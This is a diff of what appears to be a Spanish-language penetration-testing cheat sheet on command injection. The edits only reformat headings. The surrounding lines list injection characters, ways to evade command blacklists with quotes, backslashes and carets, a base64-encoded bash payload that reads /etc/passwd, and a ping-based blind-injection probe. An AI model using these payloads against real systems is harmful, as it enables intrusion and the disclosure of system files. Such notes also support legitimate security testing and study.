@@ -34,17 +34,17 @@ XQuery Injection 	' ; -- /* */
 Shellcode Injection 	\x \u %u %n
 Header Injection 	\n \r\n \t %0d %0a %09
 
-##########bypass command blacklisted
+### bypass command blacklisted
 
 podemos agregar caracteres que no son tomados en cuenta en linux y windows como las comillas simples y dobles entre la morfologia del comando
 who'am'i
 who"am"i
 
-linux only:
+##### Linux only:
 who$@ami
 w\ho\am\i
 
-windows:
+##### Windows:
  who^ami
 
 podemos encontrarnos otras medidas como firewalls que nos bloqueen los comandos, con lo cual podemos utilizar diferentes técnicas de bypass:
@@ -65,8 +65,9 @@ resultado: Y2F0IC9ldGMvcGFzc3dkIHwgZ3JlcCAzMw==
 payload: bash<<<$(base64 -d<<<Y2F0IC9ldGMvcGFzc3dkIHwgZ3JlcCAzMw==)
 
 
-################### Blind command injection
+### Blind command injection
 Podemos probar blind command injections utilizando comandos que incluyan un temporizador:
+
 parametro= x||ping+-c+10+127.0.0.1||
 
 Redirecting Output:
